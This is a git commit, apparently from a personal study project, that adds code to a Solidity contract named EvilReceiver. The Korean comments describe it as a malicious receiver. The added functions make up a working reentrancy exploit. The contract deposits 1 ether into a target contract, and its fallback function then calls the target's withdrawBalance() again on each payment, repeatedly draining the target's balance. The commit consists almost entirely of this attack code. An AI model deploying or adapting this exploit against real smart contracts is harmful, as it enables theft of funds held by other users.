86a282c0441e32f690d80794f82025d5bc220c94
DESKTOP-UGITS1R\TEI <93louis@gmail.com>
2019-06-11 00:53:17 +0900

    악의적 리시버 업데이트

--- EvilReceiver.sol
+++ EvilReceiver.sol
@@ -9,4 +9,34 @@ contract EvilReceiver{
         target = _target;
     }
     
+    //fallback 함수
+    function() payable{
+        BalanceLog(this.balance);
+
+        //VictimBalance를 호출 
+        if(!msg.sender.call.value(0)(bytes4(sha3("withdrawBalance()")))){
+            MessageLog("FAIL");
+        } else {
+            MessageLog("SUCCESS");
+        }
+    }
+
+    //EOA로부터 송금받을 때 사용하는 함수
+    function addBalance() public payable {
+        
+    }
+
+    //공격 대상으로 송금
+    function sendToTarget() public {
+        if(!target.call.value(1 ether)(bytes4(sha3("addBalance()")))){
+            throw;
+        }
+    }
+
+    //공격 대상에게 인출할 때 사용하는 함수 
+    function withdraw() public {
+        if(!target.call.value(0)(bytes4(sha3("withdrawBalance()")))){
+            throw;
+        }
+    }
 }
